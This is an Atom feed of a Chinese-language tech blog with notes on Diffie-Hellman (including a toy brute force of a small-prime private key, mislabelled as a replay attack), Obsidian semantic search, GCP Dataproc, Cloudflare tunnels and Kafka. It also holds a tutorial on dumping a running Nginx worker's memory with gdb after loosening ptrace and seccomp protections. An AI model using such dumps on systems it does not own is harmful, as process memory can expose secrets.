<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:base="https://hung-jia-jun.github.io">
    <title>Jason&#39;s tech blog</title>
    <link href="https://hung-jia-jun.github.io/feed.xml" rel="self" >
    <link href="https://hung-jia-jun.github.io" >
    <updated>2025-12-18T06:26:41Z</updated>
    <id>https://hung-jia-jun.github.io</id>
        <entry>
            <title>
                技術筆記
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/</id>
            <content type="html">
                &lt;p&gt;just 技術筆記&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/" >
        </entry>
        <entry>
            <title>
                密碼學 - 零知識證明 - 密鑰協商
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/密碼學 - 零知識證明 - 密鑰協商/</id>
            <content type="html">
                &lt;img src=&quot;https://www.plantuml.com/plantuml/svg/SoWkIImgAStDuNA0inAJI_AB51npCfDJeMod_2GkBbjRXQUjQrvEwtxQt_niwWu5Mriki1e5NJkG0WKhgBH2WOv2keB6qoNBNsnU1LJuegFz-PJvppecF6rjrWGRytBsp6VJTZwViWWe_dnvuyk96u1ge6Otx44n6CAmKdZPkEFPvFQNirOyMmdLef28RltpcNjUDZGgE2hOAcYaQsabQYgeAXHmWUJWIh0OamHJ0RCAQemJr9WaY348TxzOqV5ytVIdhHkVx5hzT7qRo0niBlO6wNV2xWomd2F2xBpyabI5eipqZ18hME00RMZVzNnM2r3jipdDpsVlU3gXXyiXDIy575SG6W00&quot; alt=&quot;uml diagram&quot; /&gt;
&lt;h1 id=&quot;diffie-hellman&quot; tabindex=&quot;-1&quot;&gt;範例程式(Diffie-Hellman 方法)&lt;/h1&gt;
&lt;p&gt;讓我們用密碼學最常用的人名 Bob 與 Alice 舉例&lt;/p&gt;
&lt;p&gt;Bob 端&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import random
# Diffie-Hellman
p = 23 # 公開參數
g = 5 # 公開參數

bob_private = random.randint(1, p-1)
bob_public = (g ** bob_private) % p  # 2
print(&amp;quot;Bob 的公開值：&amp;quot;, bob_public)

alice_public = int(input(&amp;quot;請輸入 Alice 的公開值: &amp;quot;))
bob_shared = (alice_public ** bob_private) % p
print(&amp;quot;Bob 計算的共享密鑰：&amp;quot;, bob_shared)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Alice 端&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import random
p = 23 # 公開參數
g = 5 # 公開參數

alice_private = random.randint(1, p-1)
alice_public = (g ** alice_private) % p  # 8
print(&amp;quot;Alice 的公開值：&amp;quot;, alice_public)

bob_public = int(input(&amp;quot;請輸入 Bob 的公開值: &amp;quot;))
alice_shared = (bob_public ** alice_private) % p
print(&amp;quot;Alice 計算的共享密鑰：&amp;quot;, alice_shared)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只要輸入對方的公開數，就能計算出共享密鑰&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250717223215.png&quot; alt=&quot;Pasted image 20250717223215.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;重放攻擊&quot; tabindex=&quot;-1&quot;&gt;重放攻擊&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Eve 已知 g, p, alice_public
p = 23 # 公開參數
g = 5 # 公開參數
alice_public = 12

# Eve 嘗試所有可能的私鑰
for possible_private in range(1, p):
    if (g ** possible_private) % p == alice_public:
        print(&amp;quot;Alice 的私鑰是：&amp;quot;, possible_private)
        break
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;離散對數問題&quot; tabindex=&quot;-1&quot;&gt;離散對數問題&lt;/h2&gt;
&lt;p&gt;在正常情況下，Eve（攻擊者）無法輕易算出 Alice 的私鑰，這正是 Diffie-Hellman 密鑰交換的安全基礎。&lt;br /&gt;
原因如下：&lt;br /&gt;
Alice 的公開值是：alice_public = (g ** alice_private) % p&lt;br /&gt;
Eve 想要知道 alice_private，必須解「離散對數問題」：已知 g、p、alice_public，求 alice_private&lt;br /&gt;
這個問題在大質數下是非常困難的（目前沒有有效的演算法），所以只要 p 夠大，Alice 的私鑰就很安全&lt;br /&gt;
但如果 p 很小（像教學範例 p=23），Eve 可以用暴力法：&lt;/p&gt;
&lt;p&gt;這種方法只適用於 p 很小的情況。&lt;br /&gt;
實務上 p 至少要 2048 位元，這樣 Eve 幾乎不可能算出 Alice 的私鑰。&lt;br /&gt;
總結：&lt;br /&gt;
p 小時，Eve 可以暴力破解 Alice 的私鑰&lt;br /&gt;
p 夠大時，Eve 幾乎不可能算出 Alice 的私鑰&lt;br /&gt;
這就是 Diffie-Hellman 的安全基礎&lt;/p&gt;
&lt;h1 id=&quot;安全質數&quot; tabindex=&quot;-1&quot;&gt;安全質數&lt;/h1&gt;
&lt;p&gt;選用夠大的「安全質數」可以防止離散對數被暴力攻擊&lt;br /&gt;
&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3526#section-2&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://datatracker.ietf.org/doc/html/rfc3526#section-2&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/密碼學 - 零知識證明 - 密鑰協商/" >
        </entry>
        <entry>
            <title>
                安裝 Obsidian 語意搜尋套件
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/安裝 Obsidian 語意搜尋套件/</id>
            <content type="html">
                &lt;p&gt;Plugin repo: &lt;a href=&quot;https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在 Settings -&amp;gt; Community plugins -&amp;gt; Browse&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181636.png&quot; alt=&quot;Pasted image 20251217181636.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;搜尋 Semantic Search&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181747.png&quot; alt=&quot;Pasted image 20251217181747.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;安裝套件&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181834.png&quot; alt=&quot;Pasted image 20251217181834.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;啟用 Semantic 套件&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181933.png&quot; alt=&quot;Pasted image 20251217181933.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;安裝 ollama&lt;br /&gt;
&lt;a href=&quot;https://ollama.com/download&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://ollama.com/download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下載 embeding model&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ollama pull nomic-embed-text  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;檢查 model 是否有安裝成功&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ ollama list
NAME                       ID              SIZE      MODIFIED   
nomic-embed-text:latest    0a109f422b47    274 MB    About an hour ago    
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;參數名稱&lt;/th&gt;
&lt;th&gt;設定值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;API URL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;http://localhost:11434/api/embed&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Model&lt;/td&gt;
&lt;td&gt;nomic-embed-text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;設定參數&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182540.png&quot; alt=&quot;Pasted image 20251217182540.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;打開 command palette&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182721.png&quot; alt=&quot;Pasted image 20251217182721.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;按照以下順序執行&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182834.png&quot; alt=&quot;Pasted image 20251217182834.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;之後就可以用這個進行語意搜尋&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217183031.png&quot; alt=&quot;Pasted image 20251217183031.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;整體語意搜尋結果還不錯&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217183146.png&quot; alt=&quot;Pasted image 20251217183146.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;總結&quot; tabindex=&quot;-1&quot;&gt;總結&lt;/h1&gt;
&lt;p&gt;透過這個 obsidian 工具，可以做到語意級別的模糊搜尋，有時候可能就是模糊的感覺，沒有明確的關鍵字，就可以考慮用這個搜尋工具進行搜尋。&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/安裝 Obsidian 語意搜尋套件/" >
        </entry>
        <entry>
            <title>
                使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學/</id>
            <content type="html">
                &lt;h1 id=&quot;主旨&quot; tabindex=&quot;-1&quot;&gt;主旨&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;本教學示範如何透過 Linux 的 pmap、/proc/&amp;lt;pid&amp;gt;/smaps 與 gdb 取得指定 process 的匿名記憶體區段，並導出成 dump 檔供後續分析。
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;0-nginx-process&quot; tabindex=&quot;-1&quot;&gt;0. 找出 nginx process&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251110210252.png&quot; alt=&quot;Pasted image 20251110210252.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;1&quot; tabindex=&quot;-1&quot;&gt;1. 找出記憶體佔用最高的區段&lt;/h2&gt;
&lt;p&gt;首先使用 pmap 檢查 Nginx worker 的 memory map，並依 RSS 由大到小排序：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ pmap -x 135 | sort -k 3 -n -r | head -3
total kB         2709340  412896  407496
00007fe347600000  468992  393644  393644 rw---   [ anon ]
00007fe3423ee000    5632    3860    3860 rw---   [ anon ]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重點：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;RSS&lt;/code&gt; 欄位表示實際佔用的實體記憶體。&lt;/li&gt;
&lt;li&gt;第一筆最大者：&lt;code&gt;00007fe347600000&lt;/code&gt;，RSS 約 393MB。&lt;/li&gt;
&lt;li&gt;標記為 &lt;code&gt;[ anon ]&lt;/code&gt;，通常代表匿名 mmap 或 GC heap、buffer、cache 等。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;2-smaps&quot; tabindex=&quot;-1&quot;&gt;2. 用 smaps 確認該地址區段的完整範圍&lt;/h2&gt;
&lt;p&gt;pmap 顯示的是區段起始地址，但實際區段長度需從 smaps 查詢。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat /proc/135/smaps | grep 7fe347600000
7fe34296e000-7fe347600000 r--s 00000000 00:36 2640400 /data/nginx/ip2proxy/PX2_CUSTOMER.mmdb
7fe347600000-7fe364000000 rw-p 00000000 00:00 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;解讀：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一段：&lt;code&gt;7fe34296e000-7fe347600000&lt;/code&gt; 是 memory-mapped file (&lt;code&gt;PX2_CUSTOMER.mmdb&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;第二段：&lt;code&gt;7fe347600000-7fe364000000&lt;/code&gt; 是匿名記憶體 (&lt;code&gt;rw-p ... 0&lt;/code&gt;)&lt;br /&gt;
這就是 pmap 顯示為 &lt;code&gt;[ anon ]&lt;/code&gt; 的那一段。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此要 dump 的實際區段範圍為：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;start: 0x7fe347600000 
end:   0x7fe364000000
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;3-gdb-attach&quot; tabindex=&quot;-1&quot;&gt;3. 使用 gdb attach 進程&lt;/h2&gt;
&lt;p&gt;進入 gdb：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ gdb -pid 135&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;若出現權限問題，需確認：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;容器需加上 &lt;code&gt;--cap-add=SYS_PTRACE --security-opt seccomp=unconfined&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;或需在宿主機設置 &lt;code&gt;kernel.yama.ptrace_scope=0&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;4-gdb-dump&quot; tabindex=&quot;-1&quot;&gt;4. 在 gdb 裡 dump 出記憶體檔案&lt;/h2&gt;
&lt;p&gt;進入 gdb 之後，執行：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;(gdb) dump memory /tmp/memdump_1 0x7fe347600000 0x7fe364000000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;說明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/tmp/memdump_1&lt;/code&gt; 為輸出檔案路徑&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;開始地址與結束地址對應 smaps 的匿名記憶體範圍&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;假如 dump 成功，會在 &lt;code&gt;/tmp&lt;/code&gt; 看到數百 MB 至數 GB 的檔案。&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;5-dump&quot; tabindex=&quot;-1&quot;&gt;5. 後續分析 dump 檔案&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;讀取可見字串：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;$ strings /tmp/memdump_1 | less&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251110210134.png&quot; alt=&quot;Pasted image 20251110210134.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學/" >
        </entry>
        <entry>
            <title>
                GCP dataproc 運行 python scripts
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/pySpark/GCP dataproc 運行 python scripts/</id>
            <content type="html">
                &lt;p&gt;建立 dataproc cluster&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcloud dataproc clusters create jason-test-spark-job &#92;
    --region=us-central1 &#92;
    --properties=&#39;^#^dataproc:conda.packages=google-cloud-storage==2.18.2#yarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;properties&quot; tabindex=&quot;-1&quot;&gt;properties&lt;/h2&gt;
&lt;p&gt;在 package 裡面安裝 python package&lt;br /&gt;
&lt;code&gt;dataproc:conda.packages=google-cloud-storage==2.18.2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;指定 memory 使用量&lt;br /&gt;
&lt;code&gt;yarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;pyspark-pip-install&quot; tabindex=&quot;-1&quot;&gt;pyspark pip install&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;建立&lt;br /&gt;
requirements.txt&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;pytest==6.2.5
pyspark==3.2.0
google-cloud-storage==1.43.0
mlflow==1.23.0
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;寫 pip init 腳本&lt;br /&gt;
pip_init.py&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
# 1. 確認 requirements.txt 文件是否已經上傳到 GCS 並下載到本地
GCS_BUCKET_PATH=&amp;quot;gs://dataproc-staging-us-central1-473678078038-tw1bdolx/requirements.txt&amp;quot;

LOCAL_PATH=&amp;quot;/tmp/requirements.txt&amp;quot;

# 下載 requirements.txt
gsutil cp ${GCS_BUCKET_PATH} ${LOCAL_PATH}

# 使用 pip 安裝依賴
pip install -r ${LOCAL_PATH}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;上傳檔案&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;gsutil cp requirements.txt gs://dataproc-staging-us-central1-473678078038-tw1bdolx/
gsutil cp pip_init.sh gs://dataproc-staging-us-central1-473678078038-tw1bdolx/
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;
&lt;p&gt;刪除原本的 cluster&lt;br /&gt;
&lt;code&gt;gcloud dataproc clusters delete jason-test-spark-job --region=us-central1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;建立 cluster 時運行腳本&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;gcloud dataproc clusters create jason-test-spark-job &#92;
--region=us-central1 &#92;
--initialization-actions=gs://dataproc-staging-us-central1-473678078038-tw1bdolx/pip_init.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;delete-cluster&quot; tabindex=&quot;-1&quot;&gt;Delete cluster&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;gcloud dataproc clusters delete jason-test-spark-job --region=us-central1&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;submit-job&quot; tabindex=&quot;-1&quot;&gt;Submit job&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;gcloud dataproc jobs submit pyspark test.py --region=us-central1 --cluster jason-test-spark-job&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!IMPORTANT]&lt;br /&gt;
記得要切換 GCP 環境 (SIT/UAT/PROD)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#python&quot;&gt;#python&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#pyspark&quot;&gt;#pyspark&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#spark&quot;&gt;#spark&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#cluster&quot;&gt;#cluster&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/pySpark/GCP dataproc 運行 python scripts/" >
        </entry>
        <entry>
            <title>
                Cloudflare tunnel 研究
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/other/Cloudflare tunnel 研究/</id>
            <content type="html">
                &lt;h1 id=&quot;目的&quot; tabindex=&quot;-1&quot;&gt;目的&lt;/h1&gt;
&lt;p&gt;手上有一台 respberry pi 3 b+&lt;br /&gt;
想在外網使用 ssh 連入進行個人機開發 or 實驗&lt;/p&gt;
&lt;p&gt;參考網站&lt;br /&gt;
&lt;a href=&quot;https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/use-cases/ssh/ssh-cloudflared-authentication/?utm_source=chatgpt.com&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/use-cases/ssh/ssh-cloudflared-authentication/?utm_source=chatgpt.com&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;流程解釋(來自官網)&quot; tabindex=&quot;-1&quot;&gt;流程解釋(來自官網)&lt;/h2&gt;
&lt;p&gt;使用者可以透過在原生終端機中驗證 &lt;code&gt;cloudflared&lt;/code&gt; ，連接到 SSH 伺服器，而無需 WARP 客户端。 此方法需要伺服器和客户端兩者都已安裝 &lt;code&gt;cloudflared&lt;/code&gt; ，以及 Cloudflare 上的活躍 Zone。 流量會透過此連線被 Proxy，使用者會使用 Cloudflare Access 憑證登入伺服器。&lt;/p&gt;
&lt;p&gt;來到 cloudflare &lt;code&gt;Overview/Tunnels&lt;/code&gt; 按下「新增通道」&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218100540.png&quot; alt=&quot;Pasted image 20251218100540.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;使用 Cloudflared 的方案&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218100617.png&quot; alt=&quot;Pasted image 20251218100617.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;設定通道名稱&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218100643.png&quot; alt=&quot;Pasted image 20251218100643.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;選擇 Respberrry pi 的 Debian 作業系統的選項&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218102645.png&quot; alt=&quot;Pasted image 20251218102645.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;複製安裝指令&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218102723.png&quot; alt=&quot;Pasted image 20251218102723.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ssh 登入到本地的 Respberry pi 機器&lt;br /&gt;
並貼上安裝指令碼&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250717152029.png&quot; alt=&quot;Pasted image 20250717152029.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;安裝後啟動 cloudflared 服務&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218104151.png&quot; alt=&quot;Pasted image 20251218104151.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;註冊完成&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218104238.png&quot; alt=&quot;Pasted image 20251218104238.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;cloudflare 儀表板已出現註冊的機器&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111615.png&quot; alt=&quot;Pasted image 20251218111615.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;按「下一步」&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111632.png&quot; alt=&quot;Pasted image 20251218111632.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;輸入下列資訊，並按下「完成設定」&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111700.png&quot; alt=&quot;Pasted image 20251218111700.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;現在已建立完通道，主機端連線設定已完成&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111725.png&quot; alt=&quot;Pasted image 20251218111725.png&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h1 id=&quot;client&quot; tabindex=&quot;-1&quot;&gt;client 連線端設定&lt;/h1&gt;
&lt;p&gt;參考資料: &lt;a href=&quot;https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/#macos&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/#macos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;mac 上面安裝&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;brew install cloudflared
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 SSH 設定檔中變更：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vim ~/.ssh/config
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;輸入以下值&lt;br /&gt;
my-ssh.xxx.ltd 為此次 tunnel 的位置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host my-ssh.xxx.ltd
ProxyCommand /usr/local/bin/cloudflared access ssh --hostname %h
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;連線成功&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111840.png&quot; alt=&quot;Pasted image 20251218111840.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;切換網路到外網環境&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111902.png&quot; alt=&quot;Pasted image 20251218111902.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;一樣是可以連線到 &lt;code&gt;my-ssh.xxx.ltd&lt;/code&gt; 的 ssh 機器&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111922.png&quot; alt=&quot;Pasted image 20251218111922.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/other/Cloudflare tunnel 研究/" >
        </entry>
        <entry>
            <title>
                kafka 高效率傳輸設定
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka 高效率傳輸設定/</id>
            <content type="html">
                &lt;p&gt;訂閱 kafka 消息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-consumer --bootstrap-server 127.0.0.1:19092 --topic wikimedia.recentchange
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;高效率傳輸時，可考慮以下設定&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;max.in.flight.requests.per.connection
&lt;ol&gt;
&lt;li&gt;每個 producer 在 broker 回覆 ack 前，最多送幾筆訊息出去&lt;/li&gt;
&lt;li&gt;若設定 = 1
&lt;ol&gt;
&lt;li&gt;訊息只會一筆一筆發，會降低效率，但好處是，若訊息需要嚴格的排序(有新增 sort key)，那很重要&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;等待一段 &lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt;，在此期間收到的消息都放在自己的暫存區，若 broker 批處理(batch.size)在 &lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt; 到達之前填滿，則立即批處理暫存區內的訊息，否則達到 &lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt; 才進行批處理&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;compression.type
&lt;ol&gt;
&lt;li&gt;批處理參數，用於 broker 端壓縮訊息使用的算法(e.g. lz4、zstd、gzip...etc)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;batch.size
&lt;ol&gt;
&lt;li&gt;批處理的單筆 message 大小，若超過，則立即處理該訊息&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka 高效率傳輸設定/" >
        </entry>
        <entry>
            <title>
                kafka  topic 實驗
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka  topic 實驗/</id>
            <content type="html">
